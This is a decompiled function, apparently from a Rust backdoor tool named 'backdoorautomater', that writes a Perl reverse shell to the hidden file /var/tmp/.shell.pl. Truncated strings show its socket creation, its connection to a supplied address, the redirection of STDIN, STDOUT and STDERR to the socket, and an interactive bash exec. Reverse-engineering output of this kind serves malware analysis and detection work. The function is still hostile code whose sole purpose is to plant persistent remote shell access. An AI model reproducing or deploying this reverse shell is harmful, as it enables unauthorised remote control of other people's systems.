
  fn backdoorautomater::modifyservice::write_shell_perl::h8eb642524aa8e285(arg1: *mut i64, arg2: *mut i64) -> *mut *mut [i8; 0x94]

{
    let mut var_88: i32;
    std::fs::File::create::hf69a1aea5d21dd7b(&var_88, "/var/tmp/.shell.pluse Socket;\n$…");
    let mut result: *mut *mut [i8; 0x94];
    
    if var_88 == 0
    {
        let fd_1: i32;
        let mut fd: i32 = fd_1;
        let result_2: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
            "use Socket;\n$p=socket(S,PF_INET…", 0xc);
        result = result_2;
        
        if result_2 != 0
        {
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
        }
        else
        {
            var_88 = "$i='kindNoneSomeZeroIpv4Ipv6info…";
            let var_80: i64 = 4;
            let var_78_1: i128 = *arg2.byte_offset(8);
            let mut var_30: i128;
            alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_30, &var_88, 2, 1, 0);
            let mut var_68: i128 = var_30;
            alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_68, 
                "';\n));\n$i='kindNoneSomeZeroIpv…", 3);
            let var_20: u64;
            let result_3: *mut *mut [i8; 0x94] =
                std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_68[8], var_20);
            result = result_3;
            
            if result_3 != 0
            {
                goto 'label_4559e5;
            }
            
            var_88 = "$p=socket(S,PF_INET,SOCK_STREAM,…";
            let var_80_1: i64 = 3;
            let var_78_2: i128 = *arg1.byte_offset(8);
            alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_30, &var_88, 2, 1, 0);
            let mut var_48: i128 = var_30;
            alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_48, 
                ";\n/var/tmp/.shell.pluse Socket;…", 2);
            let result_4: *mut *mut [i8; 0x94] =
                std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_48[8], var_20);
            result = result_4;
            
            if result_4 != 0
            {
                'label_4559db:
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_48);
                'label_4559e5:
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_68);
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
            }
            else
            {
                let result_5: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                    &fd, "socket(S,PF_INET,SOCK_STREAM,get…", 0x35);
                result = result_5;
                
                if result_5 != 0
                {
                    goto 'label_4559db;
                }
                
                let result_6: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                    &fd, "if(connect(S,sockaddr_in($p,inet…", 0x2e);
                result = result_6;
                
                if result_6 != 0
                {
                    goto 'label_4559db;
                }
                
                let result_7: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                    &fd, "open(STDIN,'>&S');\nopen(STDOUT,…", 0x13);
                result = result_7;
                
                if result_7 != 0
                {
                    goto 'label_4559db;
                }
                
                let result_8: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                    &fd, "open(STDOUT,'>&S');\nopen(STDERR…", 0x14);
                result = result_8;
                
                if result_8 != 0
                {
                    goto 'label_4559db;
                }
                
                let result_9: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                    &fd, "open(STDERR,'>&S');\nexec('/usr/…", 0x14);
                result = result_9;
                
                if result_9 != 0
                {
                    goto 'label_4559db;
                }
                
                let result_10: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                    &fd, "exec('/usr/bin/bash -i');\n};\nc…", 0x1a);
                result = result_10;
                
                if result_10 != 0
                {
                    goto 'label_4559db;
                }
                
                let result_11: *mut *mut [i8; 0x94] =
                    std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, &data_566081[0x42], 3);
                result = result_11;
                
                if result_11 != 0
                {
                    goto 'label_4559db;
                }
                
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_48);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_68);
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
                result = nullptr;
            }
        }
    }
    else
    {
        let result_1: *mut *mut [i8; 0x94];
        result = result_1;
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
    }
    
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg1);
    result
}
